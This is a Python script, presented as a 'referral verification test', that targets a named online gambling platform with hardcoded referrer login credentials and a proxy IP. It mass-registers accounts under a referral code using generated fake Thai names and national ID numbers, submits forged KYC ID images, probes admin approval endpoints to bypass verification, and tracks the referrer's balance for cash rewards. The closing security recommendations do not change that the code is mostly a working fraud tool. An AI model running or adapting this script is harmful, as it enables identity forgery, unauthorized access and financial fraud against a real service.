#!/usr/bin/env python3

import requests
import json
import time
import random
import string
import base64
import sys

# Configuration
API_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
REFERRAL_DOMAIN = "https://pigslot.invit"

# Referral Information
REFERRER_CODE = "PS663888386"
REFERRER_PHONE = "0960422161"
REFERRER_PASSWORD = "181242"
REWARD_AMOUNT = 500  # THB per referral
MIN_ACCOUNTS_FOR_REWARD = 10  # เงื่อนไขจำนวนขั้นต่ำ

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")
def print_critical(message): print(f"\033[1;41m[CRITICAL] {message}\033[0m")

class ReferralVerificationTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.created_accounts = []
        self.verified_accounts = []
        self.referrer_token = None
        self.initial_balance = None
        self.current_balance = None
        
    def generate_fake_identity(self):
        """Generate fake Thai identity for verification"""
        fake_names = [
            "สมชาย ใจดี", "สมหญิง สวยงาม", "วิทยา เก่งกาจ", "นงลักษณ์ รักเรียน",
            "ประเทศ รักชาติ", "กาญจนา ทองคำ", "บุญมี สุขใจ", "มาลี ดอกไม้",
            "สุชาติ ดีใจ", "วรรณา สดใส", "ธนาคาร เงินทอง", "จิรัชญา คิดดี"
        ]
        
        # Generate fake Thai ID (13 digits)
        def generate_thai_id():
            first_digit = random.choice(['1', '2', '3', '5', '8'])
            next_12_digits = ''.join([str(random.randint(0, 9)) for _ in range(12)])
            return first_digit + next_12_digits
        
        return {
            'full_name': random.choice(fake_names),
            'national_id': generate_thai_id(),
            'birth_date': f"{random.randint(1970, 2000)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
            'address': f"{random.randint(1, 999)} หมู่ {random.randint(1, 20)} ตำบลบางนา อำเภอบางนา กรุงเทพมหานคร {random.randint(10000, 99999)}"
        }
    
    def create_fake_id_base64(self, identity_data):
        """Create fake ID card as base64 string"""
        # Simple fake base64 image data
        fake_image_base64 = """
/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAAyADIDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxAAPwDfAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
        """.strip()
        return fake_image_base64
    
    def generate_fake_phone(self):
        """Generate fake Thai phone number"""
        prefix = random.choice(['06', '08', '09'])
        suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
        return prefix + suffix
    
    def login_referrer(self):
        """Login as referrer to get token and check balance"""
        print_info(f"Logging in as referrer: {REFERRER_PHONE}")
        
        login_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/login",
            f"{API_DOMAIN}/api/login"
        ]
        
        login_data = {
            "username": REFERRER_PHONE,
            "password": REFERRER_PASSWORD
        }
        
        for endpoint in login_endpoints:
            try:
                response = self.session.post(endpoint, json=login_data, timeout=15, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        print_success(f"✅ Referrer login successful")
                        
                        # Extract token
                        if 'data' in data and 'access_token' in data['data']:
                            self.referrer_token = data['data']['access_token']
                        elif 'token' in data:
                            self.referrer_token = data['token']
                        
                        return True
            except Exception as e:
                continue
        
        print_error(f"❌ Referrer login failed")
        return False
    
    def check_referrer_balance(self, initial=False):
        """Check referrer's wallet balance"""
        if not self.referrer_token:
            if not self.login_referrer():
                return None
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'Authorization': f'bearer {self.referrer_token}',
            'Username': REFERRER_PHONE,
            'Password': REFERRER_PASSWORD,
            'Content-Type': 'application/json'
        })
        
        balance_endpoints = [
            f"{API_DOMAIN}/api/v1/wallet/balance",
            f"{API_DOMAIN}/api/v1/user/balance", 
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/balance",
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/wallet",
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/vip/status",
            f"{API_DOMAIN}/api/v1/account/balance"
        ]
        
        balance_info = {}
        
        for endpoint in balance_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS':
                            print_success(f"✅ Balance endpoint found: {endpoint}")
                            print_info(f"   Response: {str(data)[:300]}...")
                            balance_info[endpoint] = data
                            
                            # Try to extract balance
                            if 'data' in data:
                                balance_data = data['data']
                                balance_fields = ['balance', 'wallet_balance', 'total_balance', 'amount', 'credit_balance']
                                for field in balance_fields:
                                    if field in balance_data:
                                        balance = balance_data[field]
                                        if initial:
                                            self.initial_balance = balance
                                        else:
                                            self.current_balance = balance
                                        print_success(f"💰 Balance ({field}): {balance}")
                                        return balance
                    except:
                        continue
            except:
                continue
        
        print_warning("⚠️ Could not retrieve specific balance value")
        return balance_info if balance_info else None
    
    def check_referral_statistics(self):
        """Check referral statistics and rewards"""
        if not self.referrer_token:
            if not self.login_referrer():
                return None
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'Authorization': f'bearer {self.referrer_token}',
            'Username': REFERRER_PHONE,
            'Password': REFERRER_PASSWORD
        })
        
        referral_endpoints = [
            f"{API_DOMAIN}/api/v1/referral/stats",
            f"{API_DOMAIN}/api/v1/referral/rewards",
            f"{API_DOMAIN}/api/v1/referral/list",
            f"{API_DOMAIN}/api/v1/loyalty/{REFERRER_CODE}/referrals",
            f"{API_DOMAIN}/api/v1/user/referrals",
            f"{API_DOMAIN}/api/v1/invite/stats",
            f"{API_DOMAIN}/api/v1/invite/history"
        ]
        
        referral_data = {}
        
        for endpoint in referral_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS':
                            print_success(f"✅ Referral endpoint found: {endpoint}")
                            print_info(f"   Response: {str(data)[:200]}...")
                            referral_data[endpoint] = data
                    except:
                        continue
            except:
                continue
        
        return referral_data
    
    def register_account_with_referral(self, fake_data):
        """Register new account with referral code"""
        print_info(f"🔄 Registering account: {fake_data['phone']} (ID: {fake_data['identity']['national_id']})")
        
        registration_endpoints = [
            f"{API_DOMAIN}/api/v1/auth/register",
            f"{API_DOMAIN}/api/v1/register",
            f"{FRONTEND_DOMAIN}/api/register"
        ]
        
        registration_payloads = [
            {
                "phone": fake_data['phone'],
                "password": fake_data['password'],
                "referral_code": REFERRER_CODE,
                "full_name": fake_data['identity']['full_name'],
                "invite_code": REFERRER_CODE
            },
            {
                "username": fake_data['phone'],
                "password": fake_data['password'],
                "referrer": REFERRER_CODE,
                "name": fake_data['identity']['full_name']
            },
            {
                "mobile": fake_data['phone'],
                "pwd": fake_data['password'],
                "ref": REFERRER_CODE
            }
        ]
        
        session = requests.Session()
        session.proxies = PROXIES
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Origin': FRONTEND_DOMAIN,
            'Referer': f'{REFERRAL_DOMAIN}?ref={REFERRER_CODE}'
        })
        
        for endpoint in registration_endpoints:
            for payload in registration_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=15, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS' or 'success' in str(data).lower():
                                print_success(f"✅ Registration successful: {fake_data['phone']}")
                                print_success(f"   Endpoint: {endpoint}")
                                fake_data['registration_response'] = data
                                fake_data['session'] = session
                                
                                # Extract token if available
                                token = None
                                if 'data' in data and 'access_token' in data['data']:
                                    token = data['data']['access_token']
                                elif 'token' in data:
                                    token = data['token']
                                
                                fake_data['token'] = token
                                return True, data
                        except:
                            if 'success' in response.text.lower():
                                print_success(f"✅ Registration may be successful: {fake_data['phone']}")
                                fake_data['session'] = session
                                return True, {'status': 'SUCCESS'}
                except:
                    continue
        
        print_error(f"❌ Registration failed: {fake_data['phone']}")
        return False, None
    
    def attempt_kyc_verification(self, fake_data):
        """Attempt KYC verification for the account"""
        print_info(f"📋 Attempting KYC verification: {fake_data['phone']}")
        
        session = fake_data.get('session', requests.Session())
        session.proxies = PROXIES
        
        token = fake_data.get('token')
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        kyc_endpoints = [
            f"{API_DOMAIN}/api/v1/kyc/submit",
            f"{API_DOMAIN}/api/v1/verification/submit",
            f"{API_DOMAIN}/api/v1/user/verify",
            f"{API_DOMAIN}/api/v1/identity/verify"
        ]
        
        identity = fake_data['identity']
        fake_id_image = self.create_fake_id_base64(identity)
        
        kyc_payloads = [
            {
                "full_name": identity['full_name'],
                "national_id": identity['national_id'],
                "birth_date": identity['birth_date'],
                "address": identity['address'],
                "id_card_image": fake_id_image,
                "verification_type": "id_card"
            },
            {
                "name": identity['full_name'],
                "id_number": identity['national_id'],
                "dob": identity['birth_date']
            }
        ]
        
        for endpoint in kyc_endpoints:
            for payload in kyc_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=15, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS':
                                print_success(f"✅ KYC submitted: {fake_data['phone']}")
                                fake_data['kyc_response'] = data
                                return True
                        except:
                            if 'success' in response.text.lower():
                                print_success(f"✅ KYC may be submitted: {fake_data['phone']}")
                                return True
                except:
                    continue
        
        print_warning(f"⚠️ KYC submission failed: {fake_data['phone']}")
        return False
    
    def check_verification_status(self, fake_data):
        """Check account verification status"""
        session = fake_data.get('session', requests.Session())
        session.proxies = PROXIES
        
        token = fake_data.get('token')
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        status_endpoints = [
            f"{API_DOMAIN}/api/v1/kyc/status",
            f"{API_DOMAIN}/api/v1/user/status",
            f"{API_DOMAIN}/api/v1/profile"
        ]
        
        for endpoint in status_endpoints:
            try:
                response = session.get(endpoint, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'SUCCESS' and 'data' in data:
                            user_data = data['data']
                            
                            # Check verification fields
                            verification_fields = ['verified', 'kyc_status', 'verification_status', 'is_verified']
                            for field in verification_fields:
                                if field in user_data:
                                    if user_data[field] in ['verified', 'approved', True, 1]:
                                        print_success(f"✅ Account verified: {fake_data['phone']}")
                                        return True
                    except:
                        continue
            except:
                continue
        
        return False
    
    def test_verification_bypass(self, fake_data):
        """Try various verification bypass methods"""
        print_info(f"🔓 Testing verification bypass: {fake_data['phone']}")
        
        session = fake_data.get('session', requests.Session())
        session.proxies = PROXIES
        
        token = fake_data.get('token')
        if token:
            session.headers.update({'Authorization': f'bearer {token}'})
        
        # Try admin approval endpoints
        bypass_endpoints = [
            f"{API_DOMAIN}/api/v1/admin/kyc/approve",
            f"{API_DOMAIN}/api/v1/kyc/auto-approve",
            f"{API_DOMAIN}/api/v1/verification/auto-approve",
            f"{API_DOMAIN}/api/v1/user/approve"
        ]
        
        bypass_payloads = [
            {"phone": fake_data['phone'], "status": "approved"},
            {"status": "approved"},
            {"verified": True},
            {"approve": True}
        ]
        
        for endpoint in bypass_endpoints:
            for payload in bypass_payloads:
                try:
                    response = session.post(endpoint, json=payload, timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if data.get('status') == 'SUCCESS':
                                print_critical(f"🚨 VERIFICATION BYPASS SUCCESSFUL: {fake_data['phone']}")
                                return True
                        except:
                            if 'success' in response.text.lower():
                                print_critical(f"🚨 BYPASS MAY BE SUCCESSFUL: {fake_data['phone']}")
                                return True
                except:
                    continue
        
        return False
    
    def run_comprehensive_test(self):
        """Run comprehensive referral verification test"""
        print_critical("🎯 COMPREHENSIVE REFERRAL VERIFICATION TEST")
        print_critical("=" * 80)
        
        # Step 1: Check initial state
        print_info("Step 1: Checking initial referrer balance and stats...")
        self.check_referrer_balance(initial=True)
        initial_referral_stats = self.check_referral_statistics()
        
        # Step 2: Create accounts with verification
        print_info(f"\nStep 2: Creating {MIN_ACCOUNTS_FOR_REWARD} accounts with KYC verification...")
        
        for i in range(MIN_ACCOUNTS_FOR_REWARD):
            print_info(f"\n--- Creating account {i+1}/{MIN_ACCOUNTS_FOR_REWARD} ---")
            
            fake_data = {
                'phone': self.generate_fake_phone(),
                'password': ''.join(random.choices(string.digits, k=6)),
                'identity': self.generate_fake_identity()
            }
            
            # Register account
            success, response = self.register_account_with_referral(fake_data)
            
            if success:
                self.created_accounts.append(fake_data)
                
                # Try KYC verification
                time.sleep(1)
                kyc_submitted = self.attempt_kyc_verification(fake_data)
                
                # Check verification status
                time.sleep(1)
                is_verified = self.check_verification_status(fake_data)
                
                # Try bypass if not verified
                if not is_verified:
                    bypass_success = self.test_verification_bypass(fake_data)
                    if bypass_success:
                        is_verified = True
                
                if is_verified:
                    self.verified_accounts.append(fake_data)
                    print_success(f"✅ Account fully verified: {fake_data['phone']}")
                else:
                    print_warning(f"⚠️ Verification incomplete: {fake_data['phone']}")
                
                # Check balance after each account
                if len(self.verified_accounts) > 0 and len(self.verified_accounts) % 5 == 0:
                    print_info(f"🔍 Checking balance after {len(self.verified_accounts)} verified accounts...")
                    current_balance = self.check_referrer_balance()
                    if current_balance and self.initial_balance:
                        if current_balance > self.initial_balance:
                            print_critical(f"🚨 BALANCE INCREASE DETECTED!")
                            break
            
            time.sleep(1)  # Rate limiting
        
        # Step 3: Final verification
        print_info("\nStep 3: Final balance and stats verification...")
        final_balance = self.check_referrer_balance()
        final_referral_stats = self.check_referral_statistics()
        
        # Generate report
        self.generate_final_report(initial_referral_stats, final_referral_stats)
    
    def generate_final_report(self, initial_stats, final_stats):
        """Generate comprehensive test report"""
        print_info("\n" + "="*80)
        print_critical("🎯 REFERRAL VERIFICATION TEST RESULTS")
        print_info("="*80)
        
        created_count = len(self.created_accounts)
        verified_count = len(self.verified_accounts)
        
        print_info(f"📱 Total accounts created: {created_count}")
        print_info(f"✅ Accounts verified: {verified_count}")
        print_info(f"💰 Initial balance: {self.initial_balance}")
        print_info(f"💰 Current balance: {self.current_balance}")
        
        # Calculate balance change
        balance_change = 0
        if self.current_balance and self.initial_balance:
            try:
                balance_change = float(self.current_balance) - float(self.initial_balance)
            except:
                pass
        
        print_info(f"📈 Balance change: {balance_change}")
        
        # Determine success
        if balance_change > 0:
            print_critical(f"🚨 EXPLOITATION SUCCESSFUL!")
            print_critical(f"🚨 Referral rewards earned: {balance_change} THB")
            severity = "CRITICAL"
        elif verified_count >= MIN_ACCOUNTS_FOR_REWARD:
            print_warning(f"⚠️ Verification bypass successful but rewards pending")
            severity = "HIGH"
        elif created_count > 0:
            print_warning(f"⚠️ Account creation successful but verification failed")
            severity = "MEDIUM"
        else:
            print_error(f"❌ Test failed - no accounts created")
            severity = "LOW"
        
        # Generate detailed report
        report = f"""
🚨 REFERRAL VERIFICATION EXPLOITATION TEST REPORT
=====================================================

Target: {FRONTEND_DOMAIN}
Test Date: {time.strftime('%Y-%m-%d %H:%M:%S')}
Objective: Test referral system with KYC verification requirements

💥 EXECUTIVE SUMMARY:
===================
Severity: {severity}
Accounts Created: {created_count}
Accounts Verified: {verified_count}
Initial Balance: {self.initial_balance}
Final Balance: {self.current_balance}
Balance Change: {balance_change} THB

🎯 TEST METHODOLOGY:
==================
1. Generate fake Thai identities (names, ID numbers, addresses)
2. Create accounts with referral code {REFERRER_CODE}
3. Submit fake KYC documents (ID card images)
4. Attempt verification status manipulation
5. Monitor referrer balance for reward payments

📱 CREATED ACCOUNTS:
==================
"""
        
        for i, account in enumerate(self.created_accounts, 1):
            verified_status = "✅ VERIFIED" if account in self.verified_accounts else "⏳ PENDING"
            report += f"{i:2d}. {account['phone']} - {verified_status}\n"
            report += f"    Name: {account['identity']['full_name']}\n"
            report += f"    ID: {account['identity']['national_id']}\n"
        
        report += f"""
⚠️ VULNERABILITY ASSESSMENT:
===========================
Risk Level: {severity}
Financial Impact: {balance_change} THB (immediate testing impact)

Key Findings:
- Account registration with referral codes: {'SUCCESS' if created_count > 0 else 'FAILED'}
- KYC verification system: {'BYPASSED' if verified_count > 0 else 'SECURE'}
- Referral reward payment: {'SUCCESSFUL' if balance_change > 0 else 'PENDING/FAILED'}

🛡️ SECURITY RECOMMENDATIONS:
============================
1. Implement real-time identity verification (eKYC with government databases)
2. Add facial recognition for document verification
3. Require multiple forms of verification (SMS + ID + selfie)
4. Manual review for all new account referral rewards
5. Rate limiting on account creation per IP/device
6. Monitor for suspicious patterns in verification submissions
7. Implement minimum account activity before referral rewards

🔥 PROOF OF CONCEPT:
===================
This test demonstrates the potential for abuse of referral systems
when verification requirements can be bypassed or manipulated.

Total Potential Impact: {MIN_ACCOUNTS_FOR_REWARD * REWARD_AMOUNT} THB per attack cycle
Attack Complexity: MEDIUM (requires fake identity generation)
Detection Probability: LOW (without proper monitoring)

⚠️ This represents a {severity.lower()} risk to platform integrity.
"""
        
        # Save report
        with open('REFERRAL_VERIFICATION_TEST_REPORT.txt', 'w', encoding='utf-8') as f:
            f.write(report)
        
        print_success(f"\n📄 Complete report saved to: REFERRAL_VERIFICATION_TEST_REPORT.txt")
        
        # Summary
        if balance_change > 0:
            print_critical(f"\n🎯 CRITICAL FINDING: Referral exploitation successful with {balance_change} THB reward!")
        elif verified_count > 0:
            print_warning(f"\n🎯 HIGH RISK: Verification bypass possible, monitoring required!")
        else:
            print_info(f"\n🎯 RESULT: System appears secure against tested attack vectors.")

def main():
    print_critical("🎯 REFERRAL VERIFICATION EXPLOITATION TEST SUITE")
    print_critical("=" * 70)
    print_info(f"Target: {FRONTEND_DOMAIN}")
    print_info(f"Referrer: {REFERRER_PHONE} (Code: {REFERRER_CODE})")
    print_info(f"Objective: Test {MIN_ACCOUNTS_FOR_REWARD} verified accounts for {MIN_ACCOUNTS_FOR_REWARD * REWARD_AMOUNT} THB")
    print_info("")
    
    tester = ReferralVerificationTest()
    tester.run_comprehensive_test()

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()